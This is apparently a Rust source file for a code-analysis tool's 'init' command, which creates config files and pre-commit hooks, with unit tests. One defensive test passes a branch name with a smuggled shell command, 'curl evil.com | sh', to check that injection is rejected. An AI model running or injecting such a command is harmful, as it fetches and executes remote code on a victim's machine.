use std::path::Path;
use std::process::ExitCode;

use fallow_config::{ExternalPluginDef, FallowConfig};

use crate::validate;

/// Options for the `init` command.
pub struct InitOptions<'a> {
    pub root: &'a Path,
    pub use_toml: bool,
    pub hooks: bool,
    pub base: Option<&'a str>,
}

pub fn run_init(opts: &InitOptions<'_>) -> ExitCode {
    if opts.hooks {
        return run_init_hooks(opts.root, opts.base);
    }
    run_init_config(opts.root, opts.use_toml)
}

fn run_init_config(root: &Path, use_toml: bool) -> ExitCode {
    // Check if any config file already exists
    let existing_names = [".fallowrc.json", "fallow.toml", ".fallow.toml"];
    for name in &existing_names {
        let path = root.join(name);
        if path.exists() {
            eprintln!("{name} already exists");
            return ExitCode::from(2);
        }
    }

    if use_toml {
        let config_path = root.join("fallow.toml");
        let default_config = r#"# fallow.toml - Codebase analysis configuration
# See https://docs.fallow.tools for documentation

# Additional entry points (beyond auto-detected ones)
# entry = ["src/workers/*.ts"]

# Patterns to ignore
# ignorePatterns = ["**/*.generated.ts"]

# Dependencies to ignore (always considered used)
# ignoreDependencies = ["autoprefixer"]

# Per-issue-type severity: "error" (fail CI), "warn" (report only), "off" (ignore)
# All default to "error" when omitted.
# [rules]
# unused-files = "error"
# unused-exports = "warn"
# unused-types = "off"
# unresolved-imports = "error"
"#;
        if let Err(e) = std::fs::write(&config_path, default_config) {
            eprintln!("Error: Failed to write fallow.toml: {e}");
            return ExitCode::from(2);
        }
        eprintln!("Created fallow.toml");
    } else {
        let config_path = root.join(".fallowrc.json");
        let default_config = r#"{
  "$schema": "https://raw.githubusercontent.com/fallow-rs/fallow/main/schema.json",
  "rules": {}
}
"#;
        if let Err(e) = std::fs::write(&config_path, default_config) {
            eprintln!("Error: Failed to write .fallowrc.json: {e}");
            return ExitCode::from(2);
        }
        eprintln!("Created .fallowrc.json");
    }
    ExitCode::SUCCESS
}

/// Detect the default branch name by querying git.
fn detect_default_branch(root: &Path) -> Option<String> {
    // Try `git symbolic-ref refs/remotes/origin/HEAD` first (most reliable).
    let output = std::process::Command::new("git")
        .args(["symbolic-ref", "refs/remotes/origin/HEAD"])
        .current_dir(root)
        .output()
        .ok()?;
    if output.status.success() {
        let full_ref = String::from_utf8(output.stdout).ok()?;
        return full_ref
            .trim()
            .strip_prefix("refs/remotes/origin/")
            .map(String::from);
    }
    None
}

fn run_init_hooks(root: &Path, base: Option<&str>) -> ExitCode {
    // Validate --base to prevent shell injection in the generated hook script.
    if let Some(b) = base
        && let Err(e) = validate::validate_git_ref(b)
    {
        eprintln!("Error: invalid --base: {e}");
        return ExitCode::from(2);
    }

    // Determine the base ref: explicit --base > detected default branch > "main"
    let base_ref = base
        .map(String::from)
        .or_else(|| detect_default_branch(root))
        .unwrap_or_else(|| "main".to_string());

    let hook_content = format!(
        "#!/bin/sh\n\
         # fallow pre-commit hook -- catch dead code before it merges\n\
         # Remove or edit this file to change the hook behavior.\n\
         # Bypass on a single commit with: git commit --no-verify\n\
         \n\
         command -v fallow >/dev/null 2>&1 || exit 0\n\
         fallow check --changed-since {base_ref} --fail-on-issues --quiet\n"
    );

    // Detect hook target: husky > lefthook > simple-git-hooks > bare .git/hooks
    enum HookTarget {
        Husky(std::path::PathBuf),
        Lefthook,
        GitHooks(std::path::PathBuf),
    }

    let target = if root.join(".husky").is_dir() {
        HookTarget::Husky(root.join(".husky/pre-commit"))
    } else if root.join(".lefthook").is_dir()
        || root.join("lefthook.yml").exists()
        || root.join("lefthook.json").exists()
    {
        HookTarget::Lefthook
    } else if root.join(".git/hooks").is_dir() {
        HookTarget::GitHooks(root.join(".git/hooks/pre-commit"))
    } else {
        eprintln!(
            "Error: No .git directory found. Run `git init` first, or use --hooks \
             from the repository root."
        );
        return ExitCode::from(2);
    };

    match target {
        HookTarget::Husky(hook_path) => {
            if hook_path.exists() {
                eprintln!(
                    "Error: .husky/pre-commit already exists. \
                     Add the following line to your existing hook:\n\n  \
                     fallow check --changed-since {base_ref} --fail-on-issues --quiet"
                );
                return ExitCode::from(2);
            }
            if let Err(e) = write_hook(&hook_path, &hook_content) {
                eprintln!("Error: Failed to write .husky/pre-commit: {e}");
                return ExitCode::from(2);
            }
            eprintln!("Created .husky/pre-commit");
        }
        HookTarget::Lefthook => {
            eprintln!(
                "Lefthook detected. Add the following to your lefthook.yml:\n\n  \
                 pre-commit:\n    commands:\n      fallow:\n        \
                 run: fallow check --changed-since {base_ref} --fail-on-issues --quiet"
            );
            return ExitCode::SUCCESS;
        }
        HookTarget::GitHooks(hook_path) => {
            if hook_path.exists() {
                eprintln!(
                    "Error: .git/hooks/pre-commit already exists. \
                     Add the following line to your existing hook:\n\n  \
                     fallow check --changed-since {base_ref} --fail-on-issues --quiet"
                );
                return ExitCode::from(2);
            }
            if let Err(e) = write_hook(&hook_path, &hook_content) {
                eprintln!("Error: Failed to write .git/hooks/pre-commit: {e}");
                return ExitCode::from(2);
            }
            eprintln!("Created .git/hooks/pre-commit");
        }
    }

    eprintln!("\nThe hook runs `fallow check` on files changed since `{base_ref}`.");
    eprintln!("To skip the hook on a single commit: git commit --no-verify");
    ExitCode::SUCCESS
}

/// Write a hook file and set the executable permission on Unix.
fn write_hook(path: &Path, content: &str) -> std::io::Result<()> {
    std::fs::write(path, content)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = std::fs::metadata(path)?.permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions(path, perms)?;
    }
    Ok(())
}

pub fn run_config_schema() -> ExitCode {
    let schema = FallowConfig::json_schema();
    match serde_json::to_string_pretty(&schema) {
        Ok(json) => {
            println!("{json}");
            ExitCode::SUCCESS
        }
        Err(e) => {
            eprintln!("Error: failed to serialize schema: {e}");
            ExitCode::from(2)
        }
    }
}

pub fn run_plugin_schema() -> ExitCode {
    let schema = ExternalPluginDef::json_schema();
    match serde_json::to_string_pretty(&schema) {
        Ok(json) => {
            println!("{json}");
            ExitCode::SUCCESS
        }
        Err(e) => {
            eprintln!("Error: failed to serialize plugin schema: {e}");
            ExitCode::from(2)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn config_opts(root: &Path, use_toml: bool) -> InitOptions<'_> {
        InitOptions {
            root,
            use_toml,
            hooks: false,
            base: None,
        }
    }

    fn hooks_opts<'a>(root: &'a Path, base: Option<&'a str>) -> InitOptions<'a> {
        InitOptions {
            root,
            use_toml: false,
            hooks: true,
            base,
        }
    }

    #[test]
    fn init_creates_json_config_by_default() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let exit = run_init(&config_opts(root, false));
        assert_eq!(exit, ExitCode::SUCCESS);
        let path = root.join(".fallowrc.json");
        assert!(path.exists());
        let content = std::fs::read_to_string(&path).unwrap();
        assert!(content.contains("$schema"));
        assert!(content.contains("rules"));
    }

    #[test]
    fn init_creates_toml_config_when_requested() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let exit = run_init(&config_opts(root, true));
        assert_eq!(exit, ExitCode::SUCCESS);
        let path = root.join("fallow.toml");
        assert!(path.exists());
        let content = std::fs::read_to_string(&path).unwrap();
        assert!(content.contains("fallow.toml"));
        assert!(content.contains("entry"));
        assert!(content.contains("ignorePatterns"));
    }

    #[test]
    fn init_fails_if_fallowrc_json_exists() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(root.join(".fallowrc.json"), "{}").unwrap();
        let exit = run_init(&config_opts(root, false));
        assert_eq!(exit, ExitCode::from(2));
    }

    #[test]
    fn init_fails_if_fallow_toml_exists() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(root.join("fallow.toml"), "").unwrap();
        let exit = run_init(&config_opts(root, false));
        assert_eq!(exit, ExitCode::from(2));
    }

    #[test]
    fn init_fails_if_dot_fallow_toml_exists() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(root.join(".fallow.toml"), "").unwrap();
        let exit = run_init(&config_opts(root, true));
        assert_eq!(exit, ExitCode::from(2));
    }

    #[test]
    fn init_json_config_is_valid_json() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        run_init(&config_opts(root, false));
        let content = std::fs::read_to_string(root.join(".fallowrc.json")).unwrap();
        let parsed: serde_json::Value = serde_json::from_str(&content).unwrap();
        assert!(parsed.is_object());
        assert!(parsed["$schema"].is_string());
    }

    #[test]
    fn init_toml_does_not_create_json() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        run_init(&config_opts(root, true));
        assert!(!root.join(".fallowrc.json").exists());
        assert!(root.join("fallow.toml").exists());
    }

    #[test]
    fn init_json_does_not_create_toml() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        run_init(&config_opts(root, false));
        assert!(!root.join("fallow.toml").exists());
        assert!(root.join(".fallowrc.json").exists());
    }

    #[test]
    fn init_existing_config_blocks_both_formats() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        // Existing .fallowrc.json should block both JSON and TOML creation
        std::fs::write(root.join(".fallowrc.json"), "{}").unwrap();
        assert_eq!(run_init(&config_opts(root, false)), ExitCode::from(2));
        assert_eq!(run_init(&config_opts(root, true)), ExitCode::from(2));
    }

    // ── Hook tests ─────────────────────────────────────────────────

    #[test]
    fn hooks_fails_without_git_dir() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let exit = run_init(&hooks_opts(root, None));
        assert_eq!(exit, ExitCode::from(2));
    }

    #[test]
    fn hooks_creates_git_hook() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
        let exit = run_init(&hooks_opts(root, None));
        assert_eq!(exit, ExitCode::SUCCESS);
        let hook_path = root.join(".git/hooks/pre-commit");
        assert!(hook_path.exists());
        let content = std::fs::read_to_string(&hook_path).unwrap();
        assert!(content.contains("fallow check"));
        assert!(content.contains("--changed-since"));
        assert!(content.contains("--fail-on-issues"));
        assert!(content.contains("command -v fallow"));
    }

    #[test]
    fn hooks_uses_custom_base_ref() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
        let exit = run_init(&hooks_opts(root, Some("develop")));
        assert_eq!(exit, ExitCode::SUCCESS);
        let content = std::fs::read_to_string(root.join(".git/hooks/pre-commit")).unwrap();
        assert!(content.contains("--changed-since develop"));
    }

    #[test]
    fn hooks_prefers_husky() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join(".husky")).unwrap();
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
        let exit = run_init(&hooks_opts(root, None));
        assert_eq!(exit, ExitCode::SUCCESS);
        assert!(root.join(".husky/pre-commit").exists());
        assert!(!root.join(".git/hooks/pre-commit").exists());
    }

    #[test]
    fn hooks_fails_if_hook_already_exists() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
        std::fs::write(root.join(".git/hooks/pre-commit"), "#!/bin/sh\n").unwrap();
        let exit = run_init(&hooks_opts(root, None));
        assert_eq!(exit, ExitCode::from(2));
    }

    #[test]
    fn hooks_detects_lefthook() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(root.join("lefthook.yml"), "").unwrap();
        // lefthook mode prints instructions and succeeds without writing a file
        let exit = run_init(&hooks_opts(root, None));
        assert_eq!(exit, ExitCode::SUCCESS);
    }

    #[cfg(unix)]
    #[test]
    fn hooks_file_is_executable() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
        run_init(&hooks_opts(root, None));
        let meta = std::fs::metadata(root.join(".git/hooks/pre-commit")).unwrap();
        let mode = meta.permissions().mode();
        assert!(
            mode & 0o111 != 0,
            "hook should be executable, mode={mode:o}"
        );
    }

    #[test]
    fn hooks_rejects_malicious_base_ref() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
        let exit = run_init(&hooks_opts(root, Some("main; curl evil.com | sh")));
        assert_eq!(exit, ExitCode::from(2));
        // Hook file should NOT have been written
        assert!(!root.join(".git/hooks/pre-commit").exists());
    }
}
